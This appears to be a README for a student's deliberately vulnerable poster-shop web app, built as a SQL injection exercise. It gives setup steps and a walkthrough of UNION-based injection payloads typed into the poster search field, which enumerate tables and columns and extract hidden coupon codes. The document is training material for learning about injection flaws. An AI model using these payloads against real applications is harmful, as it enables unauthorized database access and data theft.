# <center> PRESENTING MY LAHTP LEGACY ASSIGNMENT - 2 SQL INJECTION</center>
## What this website do ?
* You can buy your favourite posters, customization options will be added soon. Due to festival season, we will give coupon code according to the purchase.
* You can find the posters exclusively in the carousel—many surprise posters are still to come!.
## Read this before executing in Linux
* Move the configuration folder to /var/www/ (Due to file permissions).
* Works perfectly in Mac and Windows.

## SETTING UP ENVIRONMENT
* To create user in adminer, use sql/adminer-user.sql
* To create DB in adminer, use sql/adminer-sql.sql

## RECOMMENDED WAY TO CLONE
* `git clone https://github.com/KuberaKrishna/LAHTP-LEGACY-2.git SQLi` || if you are not using the default 'SQLi', have to replace 'SQLi' to 'Your filename' in _libs/load.php line 7.
## SQL Injection
+----------------------+<br>
| UNION based attacks |<br>
+----------------------+
### Information Gathering
* To detect SQL injection vulnerabilities,<br>Query in [Enter poster name] > 'HELLO WORLD, if there is an error: SQLi.<br>
### Scanning
* To find the number of columns,<br>Query in [Enter poster name] > 'ORDER BY 3#. Found the column by bruteforcing ORDER BY clause number.
* To find which paramter is displaying,<br>Query in [Enter poster name] > 'UNION SELECT 'S','N','A'#. Found 'S' and 'A' is displaying the webpage and 'N' is displaying in < img class="php-posterimg" src="posters/N" alt="Poster">

### Gaining Access
* To find the table name of the current database,<br>Query in [Enter poster name] > 'UNION SELECT TABLE_NAME, NULL, TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = SCHEMA()#. Will retrieve all the table name which is inside the current database.
* To find the column name in the current table,<br>Query in [Enter poster name] > 'UNION SELECT GROUP_CONCAT(COLUMN_NAME,'\n'), NULL, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Posters_Table'#. Will retrieve all the column name which is inside the 'Posters_Table'.
* To retrieve interesting data about DAMN Poster,<br>Query in [Enter poster name] > 'UNION SELECT POSTERNAME, NULL, COUPONCODE FROM POSTERS_TABLE#.
